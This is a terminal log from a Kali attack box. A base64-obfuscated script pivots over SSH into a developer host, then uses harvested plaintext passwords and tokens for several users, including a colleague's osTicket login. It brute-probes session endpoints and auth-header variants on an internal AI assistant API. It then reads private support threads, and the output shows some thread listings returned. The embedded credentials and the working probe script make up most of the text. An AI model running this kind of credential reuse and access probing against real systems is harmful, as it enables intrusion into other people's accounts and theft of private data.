@@ -1,0 +1,92 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/p3.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CkE9aHR0cHM6Ly9hc3Npc3RhbnQua2VwbGVyb3BzLnRlc3QKbG9naW4oKXsgY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgIntcInVzZXJuYW1lXCI6XCIkMVwiLFwicGFzc3dvcmRcIjpcIiQyXCJ9IiAiJEEvYXBpL3JlcXVlc3QtdG9rZW4iIHwgcHl0aG9uMyAtYyAnaW1wb3J0IGpzb24sc3lzO2Q9anNvbi5sb2FkKHN5cy5zdGRpbik7cHJpbnQoZC5nZXQoInRva2VuIikgb3IgIk5PTkUiKSc7IH0KSldUPSQobG9naW4gcm93YW4uaXRvIGZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4bykKTUpXVD0kKGxvZ2luIG1heWEucmFuc2NvbWJlIHNXUWEzMTA4NUZUUWVrWmhIVHhVeWZfOUUxbWFycTB1cjhXTkNLbVR0bmspClNVUD1ma19zdXBwb3J0X3Jvd2FuXzJmeHRYTmtVaktNYmN2UEJsQW90MEpwMHZWTnBwTDliCmVjaG8gIkpXVD0keyNKV1R9IE1KV1Q9JHsjTUpXVH0iCgpwcm9iZSgpeyAjIHBhdGggbWV0aG9kIGV4dHJhLWFyZ3MuLi4KICBwPSQxOyBtPSR7MjotR0VUfTsgc2hpZnQgMgogIG91dD0kKGN1cmwgLXNTIC1tIDggLS1jYWNlcnQgJENBIC1YICIkbSIgIiRAIiAtbyAvdG1wL3BiIC13ICcle2h0dHBfY29kZX0nICIkQSRwIikKICBib2R5PSQoaGVhZCAtYyAxNjAgL3RtcC9wYiB8IHRyICdcbicgJyAnKQogIGNhc2UgIiRib2R5IiBpbgogICAgKiI8IURPQ1RZUEUgaHRtbD4iKikgYm9keT0iU1BBIiA7OwogIGVzYWMKICBlY2hvICIkbSAkcCAtPiAkb3V0IDo6ICRib2R5Igp9CgplY2hvICIjIyMjIHNlc3Npb24taXNoIHBhdGhzIChubyBhdXRoKSIKZm9yIHAgaW4gL2FwaS9zZXNzaW9uIC9hcGkvc2Vzc2lvbi9sb2dpbiAvYXBpL3Nlc3Npb24vbmV3IC9hcGkvc2Vzc2lvbi9jcmVhdGUgL2FwaS9zZXNzaW9uL3N0YXJ0IC9hcGkvc2Vzc2lvbi9yZXF1ZXN0IC9hcGkvc2Vzc2lvbnMgL2FwaS9hdXRoL3Nlc3Npb24gL2FwaS9hdXRoL2xvZ2luIC9hcGkvc3VwcG9ydC9zZXNzaW9uIC9hcGkvc3VwcG9ydC9zZXNzaW9ucyAvYXBpL3N1cHBvcnQvbG9naW4gL2FwaS9zdXBwb3J0L3Rva2VuIC9hcGkvaW50ZWdyYXRpb24vc2Vzc2lvbiAvYXBpL2ludGVncmF0aW9uL3Rva2VuIC9hcGkvZmllbGRrZXN0L3Nlc3Npb24gL2FwaS9maWVsZGtlc3QvdG9rZW4gL2FwaS9hY2NvdW50L3Nlc3Npb24gL2FwaS9zdGFmZi9zZXNzaW9uIC9hcGkvb3N0aWNrZXQvc2Vzc2lvbiAvYXBpL3RpY2tldC9zZXNzaW9uIC9hcGkvYW5zd2VycyAvYXBpL2Fuc3dlciAvYXBpL2NvbnZlcnNhdGlvbnMgL2FwaS90aHJlYWRzIC9hcGkvY2FzZXMgL2FwaS9kb2N1bWVudHMgL2FwaS9zZWxlY3Rpb25zIC9hcGkvY29tcGxldGlvbnMvZXhhbXBsZXMvQ09NUC1KT0ItMTc7IGRvCiAgcHJvYmUgIiRwIiBHRVQKZG9uZQoKZWNobyAiIyMjIyBQT1NUIC9hcGkvc2Vzc2lvbi1pc2ggd2l0aCBqd3QiCmZvciBwIGluIC9hcGkvc2Vzc2lvbiAiL2FwaS9zZXNzaW9uL2xvZ2luIiAvYXBpL3Nlc3Npb24vbmV3IC9hcGkvc2Vzc2lvbi9jcmVhdGUgL2FwaS9zdXBwb3J0L3Nlc3Npb24gL2FwaS9hdXRoL3Nlc3Npb24gL2FwaS9pbnRlZ3JhdGlvbi9zZXNzaW9uIC9hcGkvYW5zd2VyczsgZG8KICBwcm9iZSAiJHAiIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkSldUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAneyJ1c2VybmFtZSI6InJvd2FuLml0byIsInBhc3N3b3JkIjoiZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIiwiY29udGV4dF9pZCI6ImN0eC1zdXBwb3J0LXByaXZhdGUtdjQiLCJjb252ZXJzYXRpb25faWQiOiJDT05WLVNVUC0yODQxLTE5In0nCmRvbmUKCmVjaG8gIiMjIyMgYXV0aCB2YXJpYW50cyBvbiAvYXBpL2NvbnZlcnNhdGlvbnMvQ09OVi1TVVAtMjg0MS0xOSIKQz0vYXBpL2NvbnZlcnNhdGlvbnMvQ09OVi1TVVAtMjg0MS0xOQpwcm9iZSAiJEMiIEdFVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiCnByb2JlICIkQyIgR0VUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFNVUCIKcHJvYmUgIiRDIiBHRVQgLUggIkF1dGhvcml6YXRpb246IFNlc3Npb24gJEpXVCIKcHJvYmUgIiRDIiBHRVQgLUggIlgtU2Vzc2lvbjogJEpXVCIKcHJvYmUgIiRDIiBHRVQgLUggIlgtU2Vzc2lvbi1JZDogJEpXVCIKcHJvYmUgIiRDIiBHRVQgLUggIlgtQW55dGhpbmdMTE0tVG9rZW46ICRKV1QiCnByb2JlICIkQyIgR0VUIC1IICJYLVN1cHBvcnQtVG9rZW46ICRTVVAiCnByb2JlICIkQyIgR0VUIC1IICJYLUludGVncmF0aW9uLVRva2VuOiAkU1VQIgpwcm9iZSAiJEMiIEdFVCAtSCAiWC1GaWVsZEtlc3QtVG9rZW46ICRTVVAiCnByb2JlICIkQyIgR0VUIC1iICJzZXNzaW9uPSRKV1QiCnByb2JlICIkQyIgR0VUIC1iICJ0b2tlbj0kSldUIgpwcm9iZSAiJEMiIEdFVCAtYiAiYW55dGhpbmdsbG09JEpXVCIKcHJvYmUgIiRDIiBHRVQgLWIgImFueXRoaW5nbGxtX3Nlc3Npb249JEpXVCIKcHJvYmUgIiRDIiBHRVQgLWIgImp3dD0kSldUIgpwcm9iZSAiJEMiIEdFVCAiJEEkQz9zZXNzaW9uPSRKV1QiCnByb2JlICIkQyIgR0VUICIkQSRDP3Rva2VuPSRKV1QiCnByb2JlICIkQyIgR0VUIC11ICJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpwcm9iZSAiJEMiIEdFVCAtdSAicm93YW4uaXRvOiRKV1QiCgplY2hvICIjIyMjIG9zdGlja2V0IGxvZ2luIHRoZW4gY29va2llIG9uIGFzc2lzdGFudCIKcm0gLWYgL3RtcC9vc3QuamFyCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYyAvdG1wL29zdC5qYXIgLW8gL3RtcC9scC5odG1sICIkQS8uLi8uLi8iIDI+L2Rldi9udWxsClMyPWh0dHBzOi8vc3VwcG9ydC5rZXBsZXJvcHMudGVzdApjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWMgL3RtcC9vc3QuamFyIC1vIC90bXAvbHAuaHRtbCAiJFMyL3NjcC9sb2dpbi5waHAiCkNTUkY9JChncmVwIC1vRSAnbmFtZT0iX19DU1JGVG9rZW5fXyJbXj5dKnZhbHVlPSJbYS1mMC05XSsiJyAvdG1wL2xwLmh0bWwgfCBncmVwIC1vRSAnW2EtZjAtOV17MTYsfScgfCBoZWFkIC0xKQpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgL3RtcC9vc3QuamFyIC1jIC90bXAvb3N0LmphciAtbyAvZGV2L251bGwgLXcgJ2xvZ2luOiV7aHR0cF9jb2RlfVxuJyBcCiAgLS1kYXRhLXVybGVuY29kZSAidXNlcmlkPW1heWEucmFuc2NvbWJlIiAtLWRhdGEtdXJsZW5jb2RlICJwYXNzd2Q9c1dRYTMxMDg1RlRRZWtaaEhUeFV5Zl85RTFtYXJxMHVyOFdOQ0ttVHRuayIgLS1kYXRhLXVybGVuY29kZSAiZG89c2lnbi1pbiIgLS1kYXRhLXVybGVuY29kZSAiX19DU1JGVG9rZW5fXz0kQ1NSRiIgIiRTMi9zY3AvbG9naW4ucGhwIgpncmVwIC1vICdPU1RTRVNTSUQuKicgL3RtcC9vc3QuamFyIHwgaGVhZCAtMwpwcm9iZSAiJEMiIEdFVCAtYiAvdG1wL29zdC5qYXIKcHJvYmUgIiRDIiBHRVQgLWIgIk9TVFNFU1NJRD0kKGdyZXAgT1NUU0VTU0lEIC90bXAvb3N0LmphciB8IGF3ayAne3ByaW50ICQ3fScgfCB0YWlsIC0xKSIKCmVjaG8gIiMjIyMgQU5TV0VSIFRIUkVBRCBhY2Nlc3MiCmZvciB1IGluICIkSldUIiAiJE1KV1QiOyBkbwogIGVjaG8gIi0tLSB0b2tlbiAke3U6MDoxMn0iCiAgZm9yIHAgaW4gIi9hcGkvd29ya3NwYWNlL3N1cHBvcnQtcHJpdmF0ZS90aHJlYWQvMmRkZjkwZmEtNjdiMi00NjM3LWExZDktMTk0MDRiN2JjMjM0L2NoYXRzIiAiL2FwaS93b3Jrc3BhY2Uvc3VwcG9ydC1wcml2YXRlL3RocmVhZC8yZGRmOTBmYS02N2IyLTQ2MzctYTFkOS0xOTQwNGI3YmMyMzQiICIvYXBpL3dvcmtzcGFjZS9zdXBwb3J0LXByaXZhdGUvdGhyZWFkcyIgIi9hcGkvd29ya3NwYWNlL3JpbGxoYXZlbi1zdXBwb3J0L3RocmVhZHMiOyBkbwogICAgcHJvYmUgIiRwIiBHRVQgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkdSIKICBkb25lCmRvbmUKZWNobyAiIyMjIyBkb2N1bWVudCBjb250ZW50IGF0dGVtcHRzIChyb3dhbiBqd3QpIgpmb3IgcCBpbiAiL2FwaS93b3Jrc3BhY2Uvc3VwcG9ydC1wcml2YXRlL2RvY3VtZW50LzFiOWFkYjkyLTY0M2QtNDg4OC05Y2M0LTUzYTU2YjczNzU0YiIgIi9hcGkvZG9jdW1lbnQvMWI5YWRiOTItNjQzZC00ODg4LTljYzQtNTNhNTZiNzM3NTRiIiAiL2FwaS93b3Jrc3BhY2Uvc3VwcG9ydC1wcml2YXRlL2RvY3VtZW50L2U5M2YwMzY4LWM2ZjItNGFjYi04YWUwLTk2NGEwM2IzNDY5OCIgIi9hcGkvd29ya3NwYWNlL3N1cHBvcnQtcHJpdmF0ZS9kb2N1bWVudHMvMWI5YWRiOTItNjQzZC00ODg4LTljYzQtNTNhNTZiNzM3NTRiIjsgZG8KICBwcm9iZSAiJHAiIEdFVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRKV1QiCmRvbmUKSU5ORVIKZWNobyBET05FX01BUktfJFJBTkRPTQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/p3.sh; bash /tmp/p3.sh; echo DONEMARK_1795201509951$((6*7))
+JWT=168 MJWT=175
+#### session-ish paths (no auth)
+GET /api/session -> 200 :: SPA
+GET /api/session/login -> 200 :: SPA
+GET /api/session/new -> 200 :: SPA
+GET /api/session/create -> 200 :: SPA
+GET /api/session/start -> 200 :: SPA
+GET /api/session/request -> 200 :: SPA
+GET /api/sessions -> 200 :: SPA
+GET /api/auth/session -> 200 :: SPA
+GET /api/auth/login -> 200 :: SPA
+GET /api/support/session -> 200 :: SPA
+GET /api/support/sessions -> 200 :: SPA
+GET /api/support/login -> 200 :: SPA
+GET /api/support/token -> 200 :: SPA
+GET /api/integration/session -> 200 :: SPA
+GET /api/integration/token -> 200 :: SPA
+GET /api/fieldkest/session -> 200 :: SPA
+GET /api/fieldkest/token -> 200 :: SPA
+GET /api/account/session -> 200 :: SPA
+GET /api/staff/session -> 200 :: SPA
+GET /api/osticket/session -> 200 :: SPA
+GET /api/ticket/session -> 200 :: SPA
+GET /api/answers -> 404 :: {"error":"not_found"} 
+GET /api/answer -> 200 :: SPA
+GET /api/conversations -> 301 :: <html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>nginx</center> </body> </html>
+GET /api/threads -> 200 :: SPA
+GET /api/cases -> 200 :: SPA
+GET /api/documents -> 200 :: SPA
+GET /api/selections -> 301 :: <html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>nginx</center> </body> </html>
+GET /api/completions/examples/COMP-JOB-17 -> 403 :: {"error":"session_required"} 
+#### POST /api/session-ish with jwt
+POST /api/session -> 200 :: SPA
+POST /api/session/login -> 200 :: SPA
+POST /api/session/new -> 200 :: SPA
+POST /api/session/create -> 200 :: SPA
+POST /api/support/session -> 200 :: SPA
+POST /api/auth/session -> 200 :: SPA
+POST /api/integration/session -> 200 :: SPA
+POST /api/answers -> 403 :: {"error":"session_required"} 
+#### auth variants on /api/conversations/CONV-SUP-2841-19
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403{"error":"session_required"}
+403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403{"error":"session_required"}
+403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+#### osticket login then cookie on assistant
+login:302
+OSTSESSID	461da66f2c6f36d421c5ff8e6bcaff0f
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+GET /api/conversations/CONV-SUP-2841-19 -> 403 :: {"error":"session_required"} 
+#### ANSWER THREAD access
+--- token eyJhbGciOiJI
+GET /api/workspace/support-private/thread/2ddf90fa-67b2-4637-a1d9-19404b7bc234/chats -> 404 :: Workspace thread does not exist.
+GET /api/workspace/support-private/thread/2ddf90fa-67b2-4637-a1d9-19404b7bc234 -> 200 :: SPA
+GET /api/workspace/support-private/threads -> 200 :: {"threads":[{"id":9,"name":"Thread","slug":"0810f29e-318f-4bcf-a047-28a915a8a77a","workspace_id":2,"user_id":2,"createdAt":"2026-11-20T19:00:13.142Z","lastUpdat
+GET /api/workspace/rillhaven-support/threads -> 200 :: {"threads":[{"id":7,"name":"Thread","slug":"edd49c6e-cca9-447b-b2f2-1438de7c801f","workspace_id":3,"user_id":2,"createdAt":"2026-11-20T18:42:08.558Z","lastUpdat
+--- token eyJhbGciOiJI
+GET /api/workspace/support-private/thread/2ddf90fa-67b2-4637-a1d9-19404b7bc234/chats -> 404 :: Workspace thread does not exist.
+GET /api/workspace/support-private/thread/2ddf90fa-67b2-4637-a1d9-19404b7bc234 -> 200 :: SPA
+GET /api/workspace/support-private/threads -> 200 :: {"threads":[],"defaultThreadChatCount":0}
+GET /api/workspace/rillhaven-support/threads -> 404 :: Workspace does not exist.
+#### document content attempts (rowan jwt)
+GET /api/workspace/support-private/document/1b9adb92-643d-4888-9cc4-53a56b73754b -> 200 :: SPA
+GET /api/document/1b9adb92-643d-4888-9cc4-53a56b73754b -> 200 :: SPA
+GET /api/workspace/support-private/document/e93f0368-c6f2-4acb-8ae0-964a03b34698 -> 200 :: SPA
+GET /api/workspace/support-private/documents/1b9adb92-643d-4888-9cc4-53a56b73754b -> 200 :: SPA
+DONE_MARK_10673
